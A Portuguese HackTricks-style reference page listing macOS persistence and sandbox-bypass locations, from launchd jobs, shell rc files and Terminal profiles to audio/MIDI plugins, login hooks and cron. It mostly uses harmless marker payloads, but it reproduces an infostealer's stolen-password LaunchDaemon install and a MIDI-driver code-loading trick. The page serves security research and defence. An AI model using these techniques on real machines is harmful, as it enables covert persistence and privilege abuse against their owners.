# Inicialização automática do macOS

{{#include ../banners/hacktricks-training.md}}

Esta seção se baseia bastante na série de artigos [**Beyond the good ol' LaunchAgents**](https://theevilbit.github.io/beyond/). Seu objetivo é identificar locais onde uma gravação de arquivo pode levar à execução posterior de código, o evento que dispara a execução e as permissões necessárias. A existência de um local não prova que o mecanismo esteja habilitado. As verificações locais mencionadas abaixo foram realizadas no macOS 26.5.2 (5 de outubro de 2026); elas não estabelecem o comportamento em todas as versões do macOS.

> [!NOTE]
> “Disparado por gravação” nem sempre significa “executado imediatamente após a gravação”. Alguns locais só são lidos no login, quando um aplicativo específico é iniciado ou quando o usuário realiza uma ação. Um payload gravável dentro de um job já configurado também é diferente de ter permissão para registrar um novo job. Teste em uma conta descartável ou VM antes de confiar em uma técnica.

## Bypass de sandbox

> [!TIP]
> Aqui você pode encontrar locais de inicialização úteis para **bypass de sandbox**, que permitem simplesmente executar algo **gravando-o em um arquivo** e **aguardando** uma **ação** muito **comum**, um **período de tempo** determinado ou uma **ação que geralmente pode ser realizada** dentro de uma sandbox sem precisar de permissões de root.

### Launchd

- Útil para bypass de sandbox: [✅](https://emojipedia.org/check-mark-button)
- Bypass de TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Locais

- **`/Library/LaunchAgents`**
  - **Disparo**: Login do usuário (ou registro explícito)
  - Requer root
- **`/Library/LaunchDaemons`**
  - **Disparo**: Inicialização do sistema (ou registro explícito)
  - Requer root
- **`/System/Library/LaunchAgents`**
  - **Disparo**: Login do usuário; local protegido do sistema da Apple
- **`/System/Library/LaunchDaemons`**
  - **Disparo**: Inicialização do sistema; local protegido do sistema da Apple
- **`~/Library/LaunchAgents`**
  - **Disparo**: Novo login

Não há um local `~/Library/LaunchDaemons` verificado pelo `launchd`. Jobs por usuário devem ficar em `~/Library/LaunchAgents`; o diretório de daemons do sistema é `/Library/LaunchDaemons`. [O guia de inicialização do launchd da Apple](https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingLaunchdJobs.html) documenta os locais verificados.

> [!TIP]
> Um fato interessante: **`launchd`** tem uma lista de propriedades incorporada na seção Mach-o `__Text.__config`, que contém outros serviços conhecidos que o launchd deve iniciar. Além disso, esses serviços podem conter `RequireSuccess`, `RequireRun` e `RebootOnSuccess`, o que significa que devem ser executados e concluídos com sucesso.
>
> Claro, ela não pode ser modificada devido à assinatura de código.

#### Descrição e exploração

**`launchd`** é o **primeiro** **processo** executado pelo kernel do OX S durante a inicialização e o último a terminar no desligamento. Ele deve sempre ter **PID 1**. Esse processo vai **ler e executar** as configurações indicadas nas **plists** **ASEP** em:

- `/Library/LaunchAgents`: Agents por usuário instalados pelo administrador
- `/Library/LaunchDaemons`: Daemons de todo o sistema instalados pelo administrador
- `/System/Library/LaunchAgents`: Agents por usuário fornecidos pela Apple.
- `/System/Library/LaunchDaemons`: Daemons de todo o sistema fornecidos pela Apple.

Quando um usuário faz login, o `launchd` carrega as plists em `~/Library/LaunchAgents` com as permissões desse usuário. Os jobs são iniciados de acordo com suas chaves; carregar uma plist, por si só, não implica execução imediata do processo.

A **principal diferença entre agents e daemons é que os agents são carregados quando o usuário faz login, enquanto os daemons são carregados na inicialização do sistema** (pois há serviços, como o ssh, que precisam ser executados antes que qualquer usuário acesse o sistema). Além disso, agents podem usar uma GUI, enquanto daemons precisam ser executados em segundo plano.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
        <string>com.apple.someidentifier</string>
    <key>ProgramArguments</key>
    <array>
        <string>/bin/sh</string>
        <string>-c</string>
        <string>touch /tmp/launched</string>
    </array>
    <key>RunAtLoad</key><true/> <!--Execute at system startup-->
    <key>StartInterval</key>
    <integer>800</integer> <!--Execute each 800s-->
    <key>KeepAlive</key>
    <dict>
        <key>SuccessfulExit</key><false/> <!--Re-execute if exit unsuccessful-->
        <!--If previous is true, then re-execute in successful exit-->
    </dict>
</dict>
</plist>
```

Cada elemento de `ProgramArguments` é um argumento separado; `launchd` não interpreta uma única string como um comando de shell. O exemplo corrigido acima pode ser verificado quanto à sintaxe sem carregá-lo usando `plutil -lint /path/to/example.plist`. Consulte a entrada local de `man launchd.plist` para `ProgramArguments`, `RunAtLoad` e `KeepAlive`.

#### Gatilhos de eventos de arquivo em jobs existentes

Um agente ou daemon **já carregado** pode usar `WatchPaths` para iniciar quando um caminho especificado for alterado. `QueueDirectories` inicia um job enquanto um diretório não estiver vazio; `StartOnMount` inicia quando um volume é montado. O [guia da Apple sobre launchd](https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingLaunchdJobs.html#//apple_ref/doc/uid/10000172i-CH2-SW9) inclui exemplos de `WatchPaths` e `QueueDirectories`. Uma gravação em um arquivo monitorado aciona o **job já configurado**; ela só permite a execução arbitrária de código se quem grava também puder controlar o executável, o script ou os dados interpretados pelo job. Simplesmente gravar um novo plist fora de um local monitorado ou registrado não o carrega.

Esta PoC de autolimpeza registra um **agente de usuário temporário** com nome exclusivo, altera apenas o próprio arquivo monitorado e remove o agente. Ela foi executada com sucesso no macOS 26.5.2, sem logout nem reinicialização:

```python
import os, pathlib, plistlib, subprocess, tempfile, time, uuid

label = f"org.hacktricks.watchtest.{uuid.uuid4().hex}"
target = f"gui/{os.getuid()}"
with tempfile.TemporaryDirectory(prefix="ht-watch-") as root:
    base = pathlib.Path(root)
    watched, marker, plist = base / "watched", base / "ran", base / "agent.plist"
    watched.write_text("before\n")
    plist.write_bytes(plistlib.dumps({
        "Label": label,
        "ProgramArguments": ["/usr/bin/touch", str(marker)],
        "WatchPaths": [str(watched)],
        "RunAtLoad": False,
    }))
    subprocess.run(["launchctl", "bootstrap", target, str(plist)], check=True)
    try:
        marker.unlink(missing_ok=True)
        watched.write_text("after\n")
        for _ in range(30):
            if marker.exists():
                break
            time.sleep(0.1)
        print("watch fired:", marker.exists())
    finally:
        subprocess.run(["launchctl", "bootout", f"{target}/{label}"], check=True)
```

A execução local exibiu `watch fired: True`, e `bootout` foi concluído com sucesso. `launchctl bootstrap` é usado aqui apenas dentro da PoC isolada; ele **não** é necessário para um job que já esteja carregado. Para avaliar com segurança um job existente, leia seu plist e o caminho resolvido de `ProgramArguments` e, em seguida, verifique se o executável relevante ou o arquivo interpretado pode ser gravado, sem alterá-lo.

Há casos em que um **agent precisa ser executado antes de o usuário iniciar sessão**; esses são chamados de **PreLoginAgents**. Por exemplo, isso é útil para disponibilizar tecnologia assistiva no início da sessão. Eles também podem ser encontrados em `/Library/LaunchAgents` (veja [**aqui**](https://github.com/HelmutJ/CocoaSampleCode/tree/master/PreLoginAgents) um exemplo).

> [!TIP]
> Novos arquivos de configuração de Daemons ou Agents serão **carregados após a próxima reinicialização ou usando** `launchctl load <target.plist>`. Também é **possível carregar arquivos .plist sem essa extensão** com `launchctl -F <file>` (no entanto, esses arquivos plist não serão carregados automaticamente após a reinicialização).\
> Também é possível **descarregar** com `launchctl unload <target.plist>` (o processo indicado por ele será encerrado),
>
> Para **garantir** que **nada** (como uma substituição) esteja **impedindo** um **Agent** ou **Daemon** de **ser executado**, execute: `sudo launchctl load -w /System/Library/LaunchDaemons/com.apple.smdb.plist`

Liste todos os agents e daemons carregados pelo usuário atual:

```bash
launchctl list
```

#### Exemplo de cadeia maliciosa de LaunchDaemon (reutilização de senha)

Um infostealer recente para macOS reutilizou uma **senha sudo capturada** para instalar um user agent e um LaunchDaemon root:<sup>[[1]](#references)</sup>

- Grave o loop do agent em `~/.agent` e torne-o executável.
- Gere um plist em `/tmp/starter` apontando para esse agent.
- Reutilize a senha roubada com `sudo -S` para copiá-lo para `/Library/LaunchDaemons/com.finder.helper.plist`, definir `root:wheel` e carregá-lo com `launchctl load`.
- Inicie o agent silenciosamente com `nohup ~/.agent >/dev/null 2>&1 &` para desanexar a saída.

```bash
printf '%s\n' "$pw" | sudo -S cp /tmp/starter /Library/LaunchDaemons/com.finder.helper.plist
printf '%s\n' "$pw" | sudo -S chown root:wheel /Library/LaunchDaemons/com.finder.helper.plist
printf '%s\n' "$pw" | sudo -S launchctl load /Library/LaunchDaemons/com.finder.helper.plist
nohup "$HOME/.agent" >/dev/null 2>&1 &
```
> [!WARNING]
> Um plist de daemon colocado em `/Library/LaunchDaemons` não se torna seguro por receber a propriedade de um usuário. `launchd` exige propriedade e permissões apropriadas para jobs do sistema e pode rejeitar um plist inseguro. Um daemon pertencente ao root normalmente é executado como root, a menos que sua configuração selecione outra conta. Verifique `UserName`, `GroupName`, a propriedade e os diagnósticos de `launchctl`; não deduza a identidade de execução apenas pelo nome do proprietário do plist.

#### Mais informações sobre launchd

**`launchd`** é o **primeiro** processo em modo de usuário iniciado pelo **kernel**. A inicialização do processo precisa ser **bem-sucedida**, e ele **não pode encerrar nem falhar**. Ele também é **protegido** contra alguns **sinais de encerramento**.

Uma das primeiras coisas que `launchd` faz é **iniciar** todos os **daemons**, como:

- **Daemons de temporizador**, baseados no horário de execução:
  - `com.apple.atrun.plist` invoca `/usr/libexec/atrun` com `StartInterval = 30` segundos no macOS 26.5.2; o estado efetivo de habilitação pode diferir da chave `Disabled` do plist, pois o launchd mantém as substituições separadamente.
  - `com.vix.cron.plist` invoca `/usr/sbin/cron` enquanto `/usr/lib/cron/tabs` contém jobs. `com.apple.systemstats.daily` é um serviço agendado diferente, não o daemon cron.
- **Daemons de rede**, como:
  - `org.cups.cups-lpd`: Escuta em TCP (`SockType: stream`) com `SockServiceName: printer`
    - `SockServiceName` precisa ser uma porta ou um serviço de `/etc/services`
  - `com.apple.xscertd.plist`: Escuta na porta TCP 1640
- **Daemons de caminho**, executados quando um caminho especificado é alterado:
  - `com.apple.postfix.master`: Verifica o caminho `/etc/postfix/aliases`
- **Daemons de notificações do IOKit**:
  - `com.apple.xartstorageremoted`: `"com.apple.iokit.matching" => { "com.apple.device-attach" => { "IOMatchLaunchStream" => 1 ...`
- **Porta Mach:**
  - `com.apple.xscertd-helper.plist`: A entrada `MachServices` indica o nome `com.apple.xscertd.helper`
- **UserEventAgent:**
  - É diferente do anterior. Ele faz com que launchd inicie aplicativos em resposta a eventos específicos. No entanto, neste caso, o binário principal envolvido não é `launchd`, mas `/usr/libexec/UserEventAgent`. Ele carrega plugins da pasta restrita pelo SIP `/System/Library/UserEventPlugins/`, onde cada plugin indica seu inicializador na chave `XPCEventModuleInitializer` ou, no caso de plugins mais antigos, no dicionário `CFPluginFactories`, sob a chave `FB86416D-6164-2070-726F-70735C216EC0` do seu `Info.plist`.

### arquivos de inicialização do shell

Writeup: [https://theevilbit.github.io/beyond/beyond_0001/](https://theevilbit.github.io/beyond/beyond_0001/)<sup>[[2]](#references)</sup>\
Writeup (xterm): [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)<sup>[[3]](#references)</sup>

- Útil para bypass de sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC Bypass: [✅](https://emojipedia.org/check-mark-button)
  - Mas é preciso encontrar um aplicativo com um TCC bypass que execute um shell que carregue esses arquivos

#### Localizações

- **`~/.zshenv`** (ou uma versão compilada mais recente, **`~/.zshenv.zwc`**)
  - **Gatilho**: Qualquer invocação comum do zsh, incluindo um `zsh -c` não interativo; `zsh -f` ignora os arquivos de inicialização do usuário.
- **`~/.zshrc`**
  - **Gatilho**: O zsh interativo é iniciado.
- **`~/.zprofile`, `~/.zlogin`**
  - **Gatilho**: O zsh de login é iniciado; esses arquivos são lidos antes e depois de `.zshrc`, respectivamente.
- **`/etc/zshenv`, `/etc/zprofile`, `/etc/zshrc`, `/etc/zlogin`**
  - **Gatilho**: Abrir um terminal com zsh
  - Requer root
- **`~/.zlogout`**
  - **Gatilho**: Um zsh de login encerra normalmente, não a saída de qualquer terminal ou shell.
- **`/etc/zlogout`**
  - **Gatilho**: Sair de um terminal com zsh
  - Requer root
- Possivelmente há mais em: **`man zsh`**
- **`~/.bashrc`**
  - **Gatilho**: Iniciar o Bash interativo **sem login**. Um Bash interativo de login só o lê se um arquivo de login o carregar explicitamente.
- **`~/.bash_profile`, `~/.bash_login`, `~/.profile`**
  - **Gatilho**: Iniciar o Bash de login; o primeiro arquivo legível nessa ordem é executado. `~/.profile` é ignorado se qualquer um dos arquivos anteriores existir.
- **`/etc/profile`**
  - **Gatilho**: Iniciar o Bash de login; alterá-lo requer root.
- **`~/.tcshrc`** ou, se não existir, **`~/.cshrc`**
  - **Gatilho**: Iniciar `tcsh`, incluindo um `tcsh -c` não interativo neste Mac. O usuário precisa invocar `tcsh`; ele não é o shell padrão do macOS.
- **`~/.login`**
  - **Gatilho**: Iniciar um `tcsh` de login, depois do arquivo rc.
- `~/.xinitrc`, `~/.xserverrc`, `/opt/X11/etc/X11/xinit/xinitrc.d/`
  - **Gatilho**: Espera-se que sejam acionados com xterm, mas ele **não está instalado** e, mesmo depois de instalado, o seguinte erro é exibido: xterm: `DISPLAY is not set`<sup>[[3]](#references)</sup>

#### Descrição e Exploração

Ao iniciar um ambiente de shell como `zsh` ou `bash`, **determinados arquivos de inicialização são executados**. Atualmente, o macOS usa `/bin/zsh` como shell padrão. O fato de o Terminal ou o SSH iniciar um shell de login ou interativo depende da configuração; não presuma que todos os arquivos acima sejam executados em todas as sessões. Embora `bash` e `sh` também estejam presentes no macOS, é preciso invocá-los explicitamente para usá-los.<sup>[[2]](#references)</sup> A [referência dos arquivos de inicialização do zsh](https://zsh.sourceforge.io/Doc/Release/Files.html) especifica a ordem, a substituição por `ZDOTDIR` e a regra de `.zwc`.

O experimento somente de leitura a seguir usou um `ZDOTDIR` descartável no macOS 26.5.2. Ele mostra quais arquivos do usuário foram lidos; nenhum arquivo real de inicialização do shell foi alterado:

```bash
lab=$(mktemp -d)
for name in zshenv zprofile zshrc zlogin zlogout; do
  printf 'print -r -- %s >> "$ZDOTDIR/seen"\n' "$name" > "$lab/.$name"
done
for flags in -c -ic -lc -lic; do
  : > "$lab/seen"
  ZDOTDIR="$lab" /bin/zsh "$flags" ':'
  printf '%s: %s\n' "$flags" "$(tr '\n' ' ' < "$lab/seen")"
done
rm -r "$lab"
```

A ordem observada foi `-c`: `zshenv`; `-ic`: `zshenv zshrc`; `-lc`: `zshenv zprofile zlogin`; `-lic`: `zshenv zprofile zshrc zlogin zlogout`. `ZDOTDIR` já deve apontar para o diretório alternativo; apenas gravar arquivos em um diretório arbitrário não é suficiente.

A [referência de inicialização do Bash](https://www.gnu.org/software/bash/manual/html_node/Bash-Startup-Files.html) diferencia shells de login dos interativos. Na máquina de teste com macOS 26.5.2, um `HOME` isolado contendo os quatro arquivos de inicialização do usuário produziu: `bash -c` → nenhum; `bash -ic` → `.bashrc`; `bash -lc` e `bash -lic` → somente `.bash_profile`. Remover `.bash_profile` fez o Bash de login ler `.bash_login` e, quando esse também foi removido, `.profile`. `BASH_ENV` pode direcionar o Bash não interativo para um arquivo, mas essa variável de ambiente já deve estar definida no processo que o invoca. Um `exit` explícito em um Bash de login também pode carregar `~/.bash_logout`.

O manual local de `tcsh(1)` documenta sua ordem de inicialização própria. Com um `HOME` descartável, `/bin/tcsh -c :` leu `.tcshrc`, ou `.cshrc` quando `.tcshrc` não existia. Um `tcsh` de login descartável leu `.tcshrc` e `.login`. Essas verificações criaram e removeram apenas arquivos temporários.

### Reabertura de aplicativos

> [!CAUTION]
> Configurar a exploração indicada e encerrar e iniciar a sessão novamente, ou até mesmo reiniciar, não executou o aplicativo durante os testes. Talvez o aplicativo precise estar em execução quando essas ações forem realizadas.

**Relato**: [https://theevilbit.github.io/beyond/beyond_0021/](https://theevilbit.github.io/beyond/beyond_0021/)<sup>[[4]](#references)</sup>

- Útil para contornar o sandbox: [✅](https://emojipedia.org/check-mark-button)
- Bypass de TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Localização

- **`~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`**
  - **Gatilho**: Reiniciar reabrindo aplicativos

#### Descrição e exploração

Todos os aplicativos a serem reabertos estão dentro do plist `~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`<sup>[[4]](#references)</sup>

Assim, para fazer com que os aplicativos reabertos iniciem o seu próprio, basta **adicionar seu aplicativo à lista**.

O UUID pode ser encontrado listando esse diretório ou com `ioreg -rd1 -c IOPlatformExpertDevice | awk -F'"' '/IOPlatformUUID/{print $4}'`

Para verificar quais aplicativos serão reabertos, você pode executar:

```bash
defaults -currentHost read com.apple.loginwindow TALAppsToRelaunchAtLogin
#or
plutil -p ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```

Para **adicionar um aplicativo a esta lista** você pode usar:

```bash
# Adding iTerm2
/usr/libexec/PlistBuddy -c "Add :TALAppsToRelaunchAtLogin: dict" \
    -c "Set :TALAppsToRelaunchAtLogin:$:BackgroundState 2" \
    -c "Set :TALAppsToRelaunchAtLogin:$:BundleID com.googlecode.iterm2" \
    -c "Set :TALAppsToRelaunchAtLogin:$:Hide 0" \
    -c "Set :TALAppsToRelaunchAtLogin:$:Path /Applications/iTerm.app" \
    ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```

### Preferências do Terminal

Artigo: [https://theevilbit.github.io/beyond/beyond_0020/](https://theevilbit.github.io/beyond/beyond_0020/)<sup>[[5]](#references)</sup>

- Útil para contornar o sandbox: [✅](https://emojipedia.org/check-mark-button)
- Bypass de TCC: [✅](https://emojipedia.org/check-mark-button)
  - O Terminal costumava ter permissões FDA do usuário que o utilizava

#### Localização

- **`~/Library/Preferences/com.apple.Terminal.plist`**
  - **Gatilho**: abrir uma nova janela ou aba do Terminal usando o perfil cujas configurações do Shell contêm o comando de inicialização

#### Descrição e exploração

Em **`~/Library/Preferences`** são armazenadas as preferências dos usuários nos aplicativos. Algumas dessas preferências podem conter uma configuração para **executar outros aplicativos/scripts**.<sup>[[5]](#references)</sup>

Por exemplo, o Terminal pode executar um comando na inicialização:

<figure><img src="../images/image (1148).png" alt="" width="495"><figcaption></figcaption></figure>

Essa configuração aparece no arquivo **`~/Library/Preferences/com.apple.Terminal.plist`** da seguinte forma:

```bash
[...]
"Window Settings" => {
    "Basic" => {
      "CommandString" => "touch /tmp/terminal_pwn"
      "Font" => {length = 267, bytes = 0x62706c69 73743030 d4010203 04050607 ... 00000000 000000cf }
      "FontAntialias" => 1
      "FontWidthSpacing" => 1.004032258064516
      "name" => "Basic"
      "ProfileCurrentVersion" => 2.07
      "RunCommandAsShell" => 0
      "type" => "Window Settings"
    }
[...]
```

Se o perfil relevante contiver um comando de inicialização e o Terminal ler essa preferência, uma nova sessão usando esse perfil poderá executá-lo. [O guia atual do Terminal da Apple](https://support.apple.com/guide/terminal/trmlshll/mac) documenta o comando por perfil em **Shell → Startup**. Apenas abrir o Terminal sem iniciar uma nova sessão usando esse perfil não é suficiente. As edições de preferência abaixo **não** foram executadas no Mac usado para a pesquisa.

Você pode adicionar isso pela CLI com:

```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" 'touch /tmp/terminal-start-command'" $HOME/Library/Preferences/com.apple.Terminal.plist
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"RunCommandAsShell\" 0" $HOME/Library/Preferences/com.apple.Terminal.plist

# Remove
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" ''" $HOME/Library/Preferences/com.apple.Terminal.plist
```

### Scripts do Terminal / Outras extensões de arquivo

- Útil para bypass de sandbox: [✅](https://emojipedia.org/check-mark-button)
- Bypass de TCC: [✅](https://emojipedia.org/check-mark-button)
  - O Terminal costuma ter permissões FDA do usuário que o utiliza

#### Localização

- **Em qualquer lugar**
  - **Acionador**: Abrir o arquivo `.terminal`, `.command` ou `.tool` específico

#### Descrição e exploração

Se um usuário abrir um arquivo de configurações **`.terminal`**, o Terminal poderá criar uma sessão com base no perfil desse arquivo; arquivos executáveis **`.command`** e **`.tool`** também podem ser abertos no Terminal. Esse é um acionador explícito de abertura de arquivo, não uma execução decorrente apenas de abrir o Terminal. Qualquer acesso TCC herdado depende das permissões concedidas ao Terminal e da operação tentada. O exemplo histórico abaixo não foi executado no Mac usado para pesquisa.

Experimente com:

```bash
# Prepare the payload
cat > /tmp/test.terminal << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>CommandString</key>
	<string>/usr/bin/touch /tmp/ht-terminal-file-marker</string>
	<key>ProfileCurrentVersion</key>
	<real>2.0600000000000001</real>
	<key>RunCommandAsShell</key>
	<false/>
	<key>name</key>
	<string>exploit</string>
	<key>type</key>
	<string>Window Settings</string>
</dict>
</plist>
EOF

# Trigger it
open /tmp/test.terminal

# After inspecting the marker, remove the disposable file and marker:
rm -f /tmp/test.terminal /tmp/ht-terminal-file-marker
```

Você também poderia usar as extensões **`.command`**, **`.tool`**, com conteúdo de scripts shell comuns, e elas também serão abertas pelo Terminal.

> [!CAUTION]
> Se o Terminal tiver **Acesso total ao disco**, poderá concluir essa ação (observe que o comando executado ficará visível em uma janela do Terminal).

### Plugins de áudio

Writeup: [https://theevilbit.github.io/beyond/beyond_0013/](https://theevilbit.github.io/beyond/beyond_0013/)<sup>[[6]](#references)</sup>\
Writeup: [https://posts.specterops.io/audio-unit-plug-ins-896d3434a882](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)<sup>[[7]](#references)</sup>

- Útil para contornar o sandbox: [✅](https://emojipedia.org/check-mark-button)
- Bypass de TCC: [🟠](https://emojipedia.org/large-orange-circle)
  - Você pode obter acesso adicional ao TCC

#### Localização

- **`/Library/Audio/Plug-Ins/HAL`**
  - Requer root
  - **Gatilho**: O servidor Core Audio carrega um plugin de dispositivo HAL compatível; uma reinicialização do servidor pode causar uma nova detecção
- **`/Library/Audio/Plug-ins/Components`**
  - Requer root
  - **Gatilho**: Um host de áudio detecta e instancia a Audio Unit instalada
- **`~/Library/Audio/Plug-ins/Components`**
  - **Gatilho**: Um host de áudio detecta e instancia a Audio Unit instalada
- **`/System/Library/Components`**
  - Localização fornecida pela Apple e protegida pelo sistema
  - **Gatilho**: Um host de áudio instancia um componente correspondente

#### Descrição

De acordo com os writeups anteriores, é possível **compilar alguns plugins de áudio** e carregá-los.<sup>[[6]](#references)[[7]](#references)</sup>

Os plugins de dispositivo HAL e as Audio Units são caminhos de carregamento distintos. O [guia de hospedagem de Audio Units da Apple](https://developer.apple.com/library/archive/documentation/MusicAudio/Conceptual/CoreAudioOverview/ARoadmaptoCommonTasks/ARoadmaptoCommonTasks.html) diz que um host precisa encontrar e instanciar um componente; copiá-lo para um diretório verificado ou reiniciar `coreaudiod` não comprova, por si só, a execução. Os plugins AUv2 são executados no processo do host, enquanto as [orientações atuais da Apple sobre Audio Units](https://developer.apple.com/documentation/audiotoolbox/incorporating-audio-effects-and-instruments) dizem que, por padrão, AUv3 é executado em um processo separado no macOS. Os controles de assinatura, sandbox e validação de bibliotecas dependem do host. Nenhum plugin de áudio foi instalado ou executado no Mac de pesquisa.

### Drivers CoreMIDI (MIDIServer)

Writeup: [https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/](https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/)<sup>[[53]](#references)</sup>

- Útil para contornar o sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Seu código é executado dentro do processo `MIDIServer`, não no sandbox do seu app
- Bypass de TCC: [🔴](https://emojipedia.org/large-red-circle)
  - `MIDIServer` é executado sob seu próprio perfil de sandbox `seatbelt`

#### Localização

- **`~/Library/Audio/MIDI Drivers/*.plugin`**
  - Não requer root (gravável pelo usuário)
  - **Gatilho**: `MIDIServer` inicia ou reinicia. Ele é iniciado sob demanda na primeira vez que qualquer processo usa CoreMIDI (abrindo *Configuração de Áudio e MIDI*, GarageBand, uma DAW ou uma página que usa WebMIDI)
- **`/Library/Audio/MIDI Drivers/*.plugin`**
  - Requer root
  - **Gatilho**: igual ao acima

#### Descrição e exploração

O `MIDIServer` da Apple (`/System/Library/Frameworks/CoreMIDI.framework/MIDIServer`) carrega bundles de **drivers** MIDI dos diretórios `Audio/MIDI Drivers`. O binário é assinado pela Apple, mas inclui o entitlement `com.apple.security.cs.disable-library-validation`, por isso carrega um bundle **não assinado ou assinado ad hoc por uma equipe diferente**, permitindo a execução de código dentro de um processo separado, pertencente à Apple, **sem root**.<sup>[[53]](#references)</sup>

Verificado no macOS 26 (somente leitura):

```bash
# user-writable, no root needed
ls -ld ~/Library/"Audio/MIDI Drivers"            # exists, owned by the user
codesign -d --entitlements :- /System/Library/Frameworks/CoreMIDI.framework/MIDIServer 2>/dev/null \
  | grep disable-library-validation              # -> com.apple.security.cs.disable-library-validation
```

Um driver é um bundle padrão que exporta uma factory `MIDIDriverInterface`; colocar o payload na factory/no construtor faz com que ele seja executado assim que o `MIDIServer` enumera os drivers. Compile-o, coloque-o como `~/Library/Audio/MIDI Drivers/Evil.plugin` e acione o carregamento sem fazer logout nem reiniciar:

```bash
# starts MIDIServer, which scans the driver directories
open -a "Audio MIDI Setup"
```

### Plugins QuickLook

Writeup: [https://theevilbit.github.io/beyond/beyond_0012/](https://theevilbit.github.io/beyond/beyond_0012/)<sup>[[8]](#references)</sup>

- Útil para contornar o sandbox: [✅](https://emojipedia.org/check-mark-button)
- Bypass de TCC: [🟠](https://emojipedia.org/large-orange-circle)
  - Você pode obter acesso adicional ao TCC

#### Localização

- `/System/Library/QuickLook`
- `/Library/QuickLook`
- `~/Library/QuickLook`
- `/Applications/AppNameHere/Contents/Library/QuickLook/`
- `~/Applications/AppNameHere/Contents/Library/QuickLook/`

#### Descrição e exploração

Os plugins QuickLook podem ser executados quando você **aciona a pré-visualização de um arquivo** (pressionando a barra de espaço com o arquivo selecionado no Finder) e há um **plugin compatível com esse tipo de arquivo** instalado.<sup>[[8]](#references)</sup>

É possível compilar seu próprio plugin QuickLook, colocá-lo em um dos locais anteriores para carregá-lo e, em seguida, acessar um arquivo compatível e pressionar a barra de espaço para acioná-lo.

Esses caminhos se referem a bundles `.qlgenerator` legados; [o guia de arquitetura do Quick Look da Apple](https://developer.apple.com/library/archive/documentation/UserExperience/Conceptual/Quicklook_Programming_Guide/Articles/QLArchitecture.html) documenta a ordem de pesquisa e os tipos de arquivo correspondentes. As **extensões de app** atuais do Quick Look são empacotadas com um app e têm regras diferentes de registro e execução. A presença de um gerador não comprova que ele será escolhido na seleção do tipo ou que seu código será executado no próprio Finder. O caminho do gerador legado foi verificado com base na documentação e na presença do diretório; nenhum gerador foi instalado ou carregado no Mac usado na pesquisa.

### ~~Hooks de Login/Logout~~

> [!CAUTION]
> Isso não funcionou para mim, nem com o LoginHook do usuário nem com o LogoutHook do root

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0022/](https://theevilbit.github.io/beyond/beyond_0022/)<sup>[[9]](#references)</sup>

- Útil para contornar o sandbox: [✅](https://emojipedia.org/check-mark-button)
- Bypass de TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Localização

- Você precisa conseguir executar algo como `defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh`
  - `Lo`calizado em `~/Library/Preferences/com.apple.loginwindow.plist`

Eles estão obsoletos, mas podem ser usados para executar comandos quando um usuário faz login.<sup>[[9]](#references)</sup>

```bash
cat > $HOME/hook.sh << EOF
#!/bin/bash
echo 'My is: \`id\`' > /tmp/login_id.txt
EOF
chmod +x $HOME/hook.sh
defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh
defaults write com.apple.loginwindow LogoutHook /Users/$USER/hook.sh
```

Esta configuração é armazenada em `/Users/$USER/Library/Preferences/com.apple.loginwindow.plist`

```bash
defaults read /Users/$USER/Library/Preferences/com.apple.loginwindow.plist
{
    LoginHook = "/Users/username/hook.sh";
    LogoutHook = "/Users/username/hook.sh";
    MiniBuddyLaunch = 0;
    TALLogoutReason = "Shut Down";
    TALLogoutSavesState = 0;
    oneTimeSSMigrationComplete = 1;
}
```

Para excluí-lo:

```bash
defaults delete com.apple.loginwindow LoginHook
defaults delete com.apple.loginwindow LogoutHook
```

O do usuário root é armazenado em **`/private/var/root/Library/Preferences/com.apple.loginwindow.plist`**

## Bypass Condicional de Sandbox

> [!TIP]
> Aqui você pode encontrar locais de inicialização úteis para **sandbox bypass** que permitem simplesmente executar algo **escrevendo-o em um arquivo** e **esperando condições não muito comuns**, como **programas específicos instalados, ações "incomuns" do usuário** ou ambientes.

### Cron

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0004/](https://theevilbit.github.io/beyond/beyond_0004/)<sup>[[10]](#references)</sup>

- Útil para bypass de sandbox: [✅](https://emojipedia.org/check-mark-button)
  - No entanto, você precisa conseguir executar o binário `crontab`
  - Ou ser root
- Bypass de TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Localização

- **`/usr/lib/cron/tabs/`**
  - É necessário ser root para ter acesso direto de escrita. Não é necessário ser root se você puder executar `crontab <file>`
  - **Trigger**: O agendamento no crontab instalado. `at` e `periodic` são mecanismos separados descritos abaixo.

#### Descrição e Exploração

Liste os cron jobs do **usuário atual** com:

```bash
crontab -l
```

O plist do launchd do daemon cron do sistema tem uma entrada `QueueDirectories` para `/usr/lib/cron/tabs`; é lá que os crontabs dos usuários instalados são mantidos. Inspecionar os crontabs de outros usuários requer root:

```bash
plutil -p /System/Library/LaunchDaemons/com.vix.cron.plist
